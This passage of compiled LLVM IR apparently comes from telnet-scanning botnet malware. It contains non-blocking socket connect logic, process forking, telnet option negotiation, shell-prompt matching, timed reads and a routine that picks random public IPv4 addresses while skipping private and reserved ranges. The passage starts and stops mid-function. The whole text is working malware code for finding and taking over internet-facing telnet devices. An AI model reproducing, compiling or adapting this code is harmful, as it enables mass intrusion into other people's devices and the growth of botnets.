  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #15
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

36:                                               ; preds = %4
  store i32 0, i32* %5, align 4
  br label %106

37:                                               ; preds = %4
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %39 = getelementptr inbounds [8 x i8], [8 x i8]* %38, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %39, i8 0, i64 8, i1 false)
  %40 = load i32, i32* %6, align 4
  %41 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  store i32 %42, i32* %16, align 4
  %43 = load i32, i32* %16, align 4
  %44 = icmp slt i32 %43, 0
  br i1 %44, label %45, label %97

45:                                               ; preds = %37
  %46 = call i32* @__errno_location() #15
  %47 = load i32, i32* %46, align 4
  %48 = icmp eq i32 %47, 115
  br i1 %48, label %49, label %95

49:                                               ; preds = %45
  %50 = load i32, i32* %9, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %51, i64* %52, align 8
  %53 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %53, align 8
  br label %54

54:                                               ; preds = %49
  store %struct.fd_set* %11, %struct.fd_set** %18, align 8
  store i32 0, i32* %17, align 4
  br label %55

55:                                               ; preds = %65, %54
  %56 = load i32, i32* %17, align 4
  %57 = zext i32 %56 to i64
  %58 = icmp ult i64 %57, 16
  br i1 %58, label %59, label %68

59:                                               ; preds = %55
  %60 = load %struct.fd_set*, %struct.fd_set** %18, align 8
  %61 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %60, i32 0, i32 0
  %62 = load i32, i32* %17, align 4
  %63 = zext i32 %62 to i64
  %64 = getelementptr inbounds [16 x i64], [16 x i64]* %61, i64 0, i64 %63
  store i64 0, i64* %64, align 8
  br label %65

65:                                               ; preds = %59
  %66 = load i32, i32* %17, align 4
  %67 = add i32 %66, 1
  store i32 %67, i32* %17, align 4
  br label %55, !llvm.loop !27

68:                                               ; preds = %55
  br label %69

69:                                               ; preds = %68
  %70 = load i32, i32* %6, align 4
  %71 = srem i32 %70, 64
  %72 = zext i32 %71 to i64
  %73 = shl i64 1, %72
  %74 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %75 = load i32, i32* %6, align 4
  %76 = sdiv i32 %75, 64
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds [16 x i64], [16 x i64]* %74, i64 0, i64 %77
  %79 = load i64, i64* %78, align 8
  %80 = or i64 %79, %73
  store i64 %80, i64* %78, align 8
  %81 = load i32, i32* %6, align 4
  %82 = add nsw i32 %81, 1
  %83 = call i32 @select(i32 %82, %struct.fd_set* null, %struct.fd_set* %11, %struct.fd_set* null, %struct.timeval* %12)
  %84 = icmp sgt i32 %83, 0
  br i1 %84, label %85, label %93

85:                                               ; preds = %69
  store i32 4, i32* %13, align 4
  %86 = load i32, i32* %6, align 4
  %87 = bitcast i32* %14 to i8*
  %88 = call i32 @getsockopt(i32 %86, i32 1, i32 4, i8* %87, i32* %13) #12
  %89 = load i32, i32* %14, align 4
  %90 = icmp ne i32 %89, 0
  br i1 %90, label %91, label %92

91:                                               ; preds = %85
  store i32 0, i32* %5, align 4
  br label %106

92:                                               ; preds = %85
  br label %94

93:                                               ; preds = %69
  store i32 0, i32* %5, align 4
  br label %106

94:                                               ; preds = %92
  br label %96

95:                                               ; preds = %45
  store i32 0, i32* %5, align 4
  br label %106

96:                                               ; preds = %94
  br label %97

97:                                               ; preds = %96, %37
  %98 = load i32, i32* %6, align 4
  %99 = call i32 (i32, i32, ...) @fcntl(i32 %98, i32 3, i8* null)
  %100 = sext i32 %99 to i64
  store i64 %100, i64* %15, align 8
  %101 = load i64, i64* %15, align 8
  %102 = and i64 %101, -2049
  store i64 %102, i64* %15, align 8
  %103 = load i32, i32* %6, align 4
  %104 = load i64, i64* %15, align 8
  %105 = call i32 (i32, i32, ...) @fcntl(i32 %103, i32 4, i64 %104)
  store i32 1, i32* %5, align 4
  br label %106

106:                                              ; preds = %97, %95, %93, %91, %36
  %107 = load i32, i32* %5, align 4
  ret i32 %107
}

declare i32 @fcntl(i32, i32, ...) #5

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 zeroext) #8

declare i32 @connect(i32, %struct.sockaddr*, i32) #5

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #12
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

8:                                                ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %47

10:                                               ; preds = %0
  %11 = load i64, i64* @numpids, align 8
  %12 = add i64 %11, 1
  store i64 %12, i64* @numpids, align 8
  %13 = load i64, i64* @numpids, align 8
  %14 = add i64 %13, 1
  %15 = mul i64 %14, 4
  %16 = call noalias align 16 i8* @malloc(i64 %15) #12
  %17 = bitcast i8* %16 to i32*
  store i32* %17, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %18

18:                                               ; preds = %34, %10
  %19 = load i32, i32* %4, align 4
  %20 = zext i32 %19 to i64
  %21 = load i64, i64* @numpids, align 8
  %22 = sub i64 %21, 1
  %23 = icmp ult i64 %20, %22
  br i1 %23, label %24, label %37

24:                                               ; preds = %18
  %25 = load i32*, i32** @pids, align 8
  %26 = load i32, i32* %4, align 4
  %27 = zext i32 %26 to i64
  %28 = getelementptr inbounds i32, i32* %25, i64 %27
  %29 = load i32, i32* %28, align 4
  %30 = load i32*, i32** %3, align 8
  %31 = load i32, i32* %4, align 4
  %32 = zext i32 %31 to i64
  %33 = getelementptr inbounds i32, i32* %30, i64 %32
  store i32 %29, i32* %33, align 4
  br label %34

34:                                               ; preds = %24
  %35 = load i32, i32* %4, align 4
  %36 = add i32 %35, 1
  store i32 %36, i32* %4, align 4
  br label %18, !llvm.loop !28

37:                                               ; preds = %18
  %38 = load i32, i32* %2, align 4
  %39 = load i32*, i32** %3, align 8
  %40 = load i64, i64* @numpids, align 8
  %41 = sub i64 %40, 1
  %42 = getelementptr inbounds i32, i32* %39, i64 %41
  store i32 %38, i32* %42, align 4
  %43 = load i32*, i32** @pids, align 8
  %44 = bitcast i32* %43 to i8*
  call void @free(i8* %44) #12
  %45 = load i32*, i32** %3, align 8
  store i32* %45, i32** @pids, align 8
  %46 = load i32, i32* %2, align 4
  store i32 %46, i32* %1, align 4
  br label %47

47:                                               ; preds = %37, %8
  %48 = load i32, i32* %1, align 4
  ret i32 %48
}

; Function Attrs: nounwind
declare i32 @fork() #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @negotiate(i32 %0, i8* %1, i32 %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  switch i32 %12, label %63 [
    i32 255, label %13
    i32 251, label %14
    i32 252, label %14
    i32 253, label %14
    i32 254, label %14
  ]

13:                                               ; preds = %3
  store i32 0, i32* %4, align 4
  br label %65

14:                                               ; preds = %3, %3, %3, %3
  store i8 -1, i8* %8, align 1
  %15 = load i32, i32* %5, align 4
  %16 = call i64 @send(i32 %15, i8* %8, i64 1, i32 16384)
  %17 = load i8*, i8** %6, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 252, %20
  br i1 %21, label %22, label %23

22:                                               ; preds = %14
  store i8 -2, i8* %8, align 1
  br label %56

23:                                               ; preds = %14
  %24 = load i8*, i8** %6, align 8
  %25 = getelementptr inbounds i8, i8* %24, i64 1
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 254, %27
  br i1 %28, label %29, label %30

29:                                               ; preds = %23
  store i8 -4, i8* %8, align 1
  br label %55

30:                                               ; preds = %23
  %31 = load i8*, i8** %6, align 8
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = load i8, i8* %32, align 1
  %34 = zext i8 %33 to i32
  %35 = icmp eq i32 3, %34
  br i1 %35, label %36, label %45

36:                                               ; preds = %30
  %37 = load i8*, i8** %6, align 8
  %38 = getelementptr inbounds i8, i8* %37, i64 1
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 253
  %42 = zext i1 %41 to i64
  %43 = select i1 %41, i32 251, i32 253
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %8, align 1
  br label %54

45:                                               ; preds = %30
  %46 = load i8*, i8** %6, align 8
  %47 = getelementptr inbounds i8, i8* %46, i64 1
  %48 = load i8, i8* %47, align 1
  %49 = zext i8 %48 to i32
  %50 = icmp eq i32 %49, 253
  %51 = zext i1 %50 to i64
  %52 = select i1 %50, i32 252, i32 254
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %8, align 1
  br label %54

54:                                               ; preds = %45, %36
  br label %55

55:                                               ; preds = %54, %29
  br label %56

56:                                               ; preds = %55, %22
  %57 = load i32, i32* %5, align 4
  %58 = call i64 @send(i32 %57, i8* %8, i64 1, i32 16384)
  %59 = load i32, i32* %5, align 4
  %60 = load i8*, i8** %6, align 8
  %61 = getelementptr inbounds i8, i8* %60, i64 2
  %62 = call i64 @send(i32 %59, i8* %61, i64 1, i32 16384)
  br label %64

63:                                               ; preds = %3
  br label %64

64:                                               ; preds = %63, %56
  store i32 0, i32* %4, align 4
  br label %65

65:                                               ; preds = %64, %13
  %66 = load i32, i32* %4, align 4
  ret i32 %66
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @matchPrompt(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.72, i64 0, i64 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #11
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %11

11:                                               ; preds = %97, %1
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #11
  %16 = icmp ult i64 %13, %15
  br i1 %16, label %17, label %100

17:                                               ; preds = %11
  br label %18

18:                                               ; preds = %74, %17
  %19 = load i32, i32* %5, align 4
  %20 = load i32, i32* %7, align 4
  %21 = icmp sgt i32 %19, %20
  br i1 %21, label %22, label %72

22:                                               ; preds = %18
  %23 = load i8*, i8** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds i8, i8* %23, i64 %25
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = sub i64 0, %28
  %30 = getelementptr inbounds i8, i8* %26, i64 %29
  %31 = load i8, i8* %30, align 1
  %32 = sext i8 %31 to i32
  %33 = icmp eq i32 %32, 0
  br i1 %33, label %70, label %34

34:                                               ; preds = %22
  %35 = load i8*, i8** %3, align 8
  %36 = load i32, i32* %5, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds i8, i8* %35, i64 %37
  %39 = load i32, i32* %7, align 4
  %40 = sext i32 %39 to i64
  %41 = sub i64 0, %40
  %42 = getelementptr inbounds i8, i8* %38, i64 %41
  %43 = load i8, i8* %42, align 1
  %44 = sext i8 %43 to i32
  %45 = icmp eq i32 %44, 32
  br i1 %45, label %70, label %46

46:                                               ; preds = %34
  %47 = load i8*, i8** %3, align 8
  %48 = load i32, i32* %5, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds i8, i8* %47, i64 %49
  %51 = load i32, i32* %7, align 4
  %52 = sext i32 %51 to i64
  %53 = sub i64 0, %52
  %54 = getelementptr inbounds i8, i8* %50, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = sext i8 %55 to i32
  %57 = icmp eq i32 %56, 13
  br i1 %57, label %70, label %58

58:                                               ; preds = %46
  %59 = load i8*, i8** %3, align 8
  %60 = load i32, i32* %5, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds i8, i8* %59, i64 %61
  %63 = load i32, i32* %7, align 4
  %64 = sext i32 %63 to i64
  %65 = sub i64 0, %64
  %66 = getelementptr inbounds i8, i8* %62, i64 %65
  %67 = load i8, i8* %66, align 1
  %68 = sext i8 %67 to i32
  %69 = icmp eq i32 %68, 10
  br label %70

70:                                               ; preds = %58, %46, %34, %22
  %71 = phi i1 [ true, %46 ], [ true, %34 ], [ true, %22 ], [ %69, %58 ]
  br label %72

72:                                               ; preds = %70, %18
  %73 = phi i1 [ false, %18 ], [ %71, %70 ]
  br i1 %73, label %74, label %77

74:                                               ; preds = %72
  %75 = load i32, i32* %7, align 4
  %76 = add nsw i32 %75, 1
  store i32 %76, i32* %7, align 4
  br label %18, !llvm.loop !29

77:                                               ; preds = %72
  %78 = load i8*, i8** %3, align 8
  %79 = load i32, i32* %5, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds i8, i8* %78, i64 %80
  %82 = load i32, i32* %7, align 4
  %83 = sext i32 %82 to i64
  %84 = sub i64 0, %83
  %85 = getelementptr inbounds i8, i8* %81, i64 %84
  %86 = load i8, i8* %85, align 1
  %87 = sext i8 %86 to i32
  %88 = load i8*, i8** %4, align 8
  %89 = load i32, i32* %6, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds i8, i8* %88, i64 %90
  %92 = load i8, i8* %91, align 1
  %93 = sext i8 %92 to i32
  %94 = icmp eq i32 %87, %93
  br i1 %94, label %95, label %96

95:                                               ; preds = %77
  store i32 1, i32* %2, align 4
  br label %101

96:                                               ; preds = %77
  br label %97

97:                                               ; preds = %96
  %98 = load i32, i32* %6, align 4
  %99 = add nsw i32 %98, 1
  store i32 %99, i32* %6, align 4
  br label %11, !llvm.loop !30

100:                                              ; preds = %11
  store i32 0, i32* %2, align 4
  br label %101

101:                                              ; preds = %100, %95
  %102 = load i32, i32* %2, align 4
  ret i32 %102
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @readUntil(i32 %0, i8* %1, i32 %2, i32 %3, i32 %4, i8* %5, i32 %6, i32 %7) #0 {
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.fd_set, align 8
  %22 = alloca %struct.timeval, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca %struct.fd_set*, align 8
  store i32 %0, i32* %10, align 4
  store i8* %1, i8** %11, align 8
  store i32 %2, i32* %12, align 4
  store i32 %3, i32* %13, align 4
  store i32 %4, i32* %14, align 4
  store i8* %5, i8** %15, align 8
  store i32 %6, i32* %16, align 4
  store i32 %7, i32* %17, align 4
  %26 = load i32, i32* %17, align 4
  store i32 %26, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %27 = load i32, i32* %13, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  store i64 %28, i64* %29, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  store i64 %31, i64* %32, align 8
  store i8* null, i8** %23, align 8
  br label %33

33:                                               ; preds = %142, %8
  %34 = load i32, i32* %18, align 4
  %35 = add nsw i32 %34, 2
  %36 = load i32, i32* %16, align 4
  %37 = icmp slt i32 %35, %36
  br i1 %37, label %38, label %48

38:                                               ; preds = %33
  %39 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  %40 = load i64, i64* %39, align 8
  %41 = icmp sgt i64 %40, 0
  br i1 %41, label %46, label %42

42:                                               ; preds = %38
  %43 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %44 = load i64, i64* %43, align 8
  %45 = icmp sgt i64 %44, 0
  br label %46

46:                                               ; preds = %42, %38
  %47 = phi i1 [ true, %38 ], [ %45, %42 ]
  br label %48

48:                                               ; preds = %46, %33
  %49 = phi i1 [ false, %33 ], [ %47, %46 ]
  br i1 %49, label %50, label %143

50:                                               ; preds = %48
  br label %51

51:                                               ; preds = %50
  store %struct.fd_set* %21, %struct.fd_set** %25, align 8
  store i32 0, i32* %24, align 4
  br label %52

52:                                               ; preds = %62, %51
  %53 = load i32, i32* %24, align 4
  %54 = zext i32 %53 to i64
  %55 = icmp ult i64 %54, 16
  br i1 %55, label %56, label %65

56:                                               ; preds = %52
  %57 = load %struct.fd_set*, %struct.fd_set** %25, align 8
  %58 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %57, i32 0, i32 0
  %59 = load i32, i32* %24, align 4
  %60 = zext i32 %59 to i64
  %61 = getelementptr inbounds [16 x i64], [16 x i64]* %58, i64 0, i64 %60
  store i64 0, i64* %61, align 8
  br label %62

62:                                               ; preds = %56
  %63 = load i32, i32* %24, align 4
  %64 = add i32 %63, 1
  store i32 %64, i32* %24, align 4
  br label %52, !llvm.loop !31

65:                                               ; preds = %52
  br label %66

66:                                               ; preds = %65
  %67 = load i32, i32* %10, align 4
  %68 = srem i32 %67, 64
  %69 = zext i32 %68 to i64
  %70 = shl i64 1, %69
  %71 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %72 = load i32, i32* %10, align 4
  %73 = sdiv i32 %72, 64
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds [16 x i64], [16 x i64]* %71, i64 0, i64 %74
  %76 = load i64, i64* %75, align 8
  %77 = or i64 %76, %70
  store i64 %77, i64* %75, align 8
  %78 = load i32, i32* %10, align 4
  %79 = add nsw i32 %78, 1
  %80 = call i32 @select(i32 %79, %struct.fd_set* %21, %struct.fd_set* null, %struct.fd_set* null, %struct.timeval* %22)
  %81 = icmp slt i32 %80, 1
  br i1 %81, label %82, label %83

82:                                               ; preds = %66
  br label %143

83:                                               ; preds = %66
  %84 = load i8*, i8** %15, align 8
  %85 = load i32, i32* %18, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds i8, i8* %84, i64 %86
  store i8* %87, i8** %23, align 8
  %88 = load i32, i32* %10, align 4
  %89 = load i8*, i8** %23, align 8
  %90 = call i64 @recv(i32 %88, i8* %89, i64 1, i32 0)
  %91 = trunc i64 %90 to i32
  store i32 %91, i32* %19, align 4
  %92 = load i32, i32* %19, align 4
  %93 = icmp eq i32 %92, -1
  br i1 %93, label %97, label %94

94:                                               ; preds = %83
  %95 = load i32, i32* %19, align 4
  %96 = icmp eq i32 %95, 0
  br i1 %96, label %97, label %98

97:                                               ; preds = %94, %83
  store i32 0, i32* %9, align 4
  br label %148

98:                                               ; preds = %94
  %99 = load i32, i32* %19, align 4
  %100 = load i32, i32* %18, align 4
  %101 = add nsw i32 %100, %99
  store i32 %101, i32* %18, align 4
  %102 = load i8*, i8** %23, align 8
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 255
  br i1 %105, label %106, label %128

106:                                              ; preds = %98
  %107 = load i32, i32* %10, align 4
  %108 = load i8*, i8** %23, align 8
  %109 = getelementptr inbounds i8, i8* %108, i64 1
  %110 = call i64 @recv(i32 %107, i8* %109, i64 2, i32 0)
  %111 = trunc i64 %110 to i32
  store i32 %111, i32* %19, align 4
  %112 = load i32, i32* %19, align 4
  %113 = icmp eq i32 %112, -1
  br i1 %113, label %117, label %114

114:                                              ; preds = %106
  %115 = load i32, i32* %19, align 4
  %116 = icmp eq i32 %115, 0
  br i1 %116, label %117, label %118

117:                                              ; preds = %114, %106
  store i32 0, i32* %9, align 4
  br label %148

118:                                              ; preds = %114
  %119 = load i32, i32* %19, align 4
  %120 = load i32, i32* %18, align 4
  %121 = add nsw i32 %120, %119
  store i32 %121, i32* %18, align 4
  %122 = load i32, i32* %10, align 4
  %123 = load i8*, i8** %23, align 8
  %124 = call i32 @negotiate(i32 %122, i8* %123, i32 3)
  %125 = icmp ne i32 %124, 0
  br i1 %125, label %127, label %126

126:                                              ; preds = %118
  store i32 0, i32* %9, align 4
  br label %148

127:                                              ; preds = %118
  br label %142

128:                                              ; preds = %98
  %129 = load i8*, i8** %15, align 8
  %130 = load i8*, i8** %11, align 8
  %131 = call i8* @strstr(i8* %129, i8* %130) #11
  %132 = icmp ne i8* %131, null
  br i1 %132, label %140, label %133

133:                                              ; preds = %128
  %134 = load i32, i32* %12, align 4
  %135 = icmp ne i32 %134, 0
  br i1 %135, label %136, label %141

136:                                              ; preds = %133
  %137 = load i8*, i8** %15, align 8
  %138 = call i32 @matchPrompt(i8* %137)
  %139 = icmp ne i32 %138, 0
  br i1 %139, label %140, label %141

140:                                              ; preds = %136, %128
  store i32 1, i32* %20, align 4
  br label %143

141:                                              ; preds = %136, %133
  br label %142

142:                                              ; preds = %141, %127
  br label %33, !llvm.loop !32

143:                                              ; preds = %140, %82, %48
  %144 = load i32, i32* %20, align 4
  %145 = icmp ne i32 %144, 0
  br i1 %145, label %146, label %147

146:                                              ; preds = %143
  store i32 1, i32* %9, align 4
  br label %148

147:                                              ; preds = %143
  store i32 0, i32* %9, align 4
  br label %148

148:                                              ; preds = %147, %146, %126, %117, %97
  %149 = load i32, i32* %9, align 4
  ret i32 %149
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @getRandomPublicIP() #0 {
  %1 = alloca [4 x i8], align 1
  %2 = alloca [16 x i8], align 16
  %3 = bitcast [4 x i8]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 1 %3, i8 0, i64 4, i1 false)
  %4 = call i32 @rand() #12
  %5 = srem i32 %4, 255
  %6 = trunc i32 %5 to i8
  %7 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  store i8 %6, i8* %7, align 1
  %8 = call i32 @rand() #12
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  %11 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  store i8 %10, i8* %11, align 1
  %12 = call i32 @rand() #12
  %13 = srem i32 %12, 255
  %14 = trunc i32 %13 to i8
  %15 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  store i8 %14, i8* %15, align 1
  %16 = call i32 @rand() #12
  %17 = srem i32 %16, 255
  %18 = trunc i32 %17 to i8
  %19 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 3
  store i8 %18, i8* %19, align 1
  br label %20

20:                                               ; preds = %167, %0
  %21 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %165, label %25

25:                                               ; preds = %20
  %26 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %27 = load i8, i8* %26, align 1
  %28 = zext i8 %27 to i32
  %29 = icmp eq i32 %28, 10
  br i1 %29, label %165, label %30

30:                                               ; preds = %25
  %31 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 100
  br i1 %34, label %35, label %45

35:                                               ; preds = %30
  %36 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %37 = load i8, i8* %36, align 1
  %38 = zext i8 %37 to i32
  %39 = icmp sge i32 %38, 64
  br i1 %39, label %40, label %45

40:                                               ; preds = %35
  %41 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = icmp sle i32 %43, 127
  br i1 %44, label %165, label %45

45:                                               ; preds = %40, %35, %30
  %46 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 127
  br i1 %49, label %165, label %50

50:                                               ; preds = %45
  %51 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %52 = load i8, i8* %51, align 1
  %53 = zext i8 %52 to i32
  %54 = icmp eq i32 %53, 169
  br i1 %54, label %55, label %60

55:                                               ; preds = %50
  %56 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %57 = load i8, i8* %56, align 1
  %58 = zext i8 %57 to i32
  %59 = icmp eq i32 %58, 254
  br i1 %59, label %165, label %60

60:                                               ; preds = %55, %50
  %61 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %62 = load i8, i8* %61, align 1
  %63 = zext i8 %62 to i32
  %64 = icmp eq i32 %63, 172
  br i1 %64, label %65, label %75

65:                                               ; preds = %60
  %66 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %67 = load i8, i8* %66, align 1
  %68 = zext i8 %67 to i32
  %69 = icmp sle i32 %68, 16
  br i1 %69, label %70, label %75

70:                                               ; preds = %65
  %71 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %72 = load i8, i8* %71, align 1
  %73 = zext i8 %72 to i32
  %74 = icmp sle i32 %73, 31
  br i1 %74, label %165, label %75

75:                                               ; preds = %70, %65, %60
  %76 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %77 = load i8, i8* %76, align 1
  %78 = zext i8 %77 to i32
  %79 = icmp eq i32 %78, 192
  br i1 %79, label %80, label %90

80:                                               ; preds = %75
  %81 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %82 = load i8, i8* %81, align 1
  %83 = zext i8 %82 to i32
  %84 = icmp eq i32 %83, 0
  br i1 %84, label %85, label %90

85:                                               ; preds = %80
  %86 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 3
  %87 = load i8, i8* %86, align 1
  %88 = zext i8 %87 to i32
  %89 = icmp eq i32 %88, 2
  br i1 %89, label %165, label %90

90:                                               ; preds = %85, %80, %75
  %91 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %92 = load i8, i8* %91, align 1
  %93 = zext i8 %92 to i32
  %94 = icmp eq i32 %93, 192
  br i1 %94, label %95, label %105

95:                                               ; preds = %90
  %96 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %97 = load i8, i8* %96, align 1
  %98 = zext i8 %97 to i32
  %99 = icmp eq i32 %98, 88
  br i1 %99, label %100, label %105

100:                                              ; preds = %95
  %101 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 3
  %102 = load i8, i8* %101, align 1
  %103 = zext i8 %102 to i32
  %104 = icmp eq i32 %103, 99
  br i1 %104, label %165, label %105

105:                                              ; preds = %100, %95, %90
  %106 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %107 = load i8, i8* %106, align 1
  %108 = zext i8 %107 to i32
  %109 = icmp eq i32 %108, 192
  br i1 %109, label %110, label %115

110:                                              ; preds = %105
  %111 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %112 = load i8, i8* %111, align 1
  %113 = zext i8 %112 to i32
  %114 = icmp eq i32 %113, 168
  br i1 %114, label %165, label %115

115:                                              ; preds = %110, %105
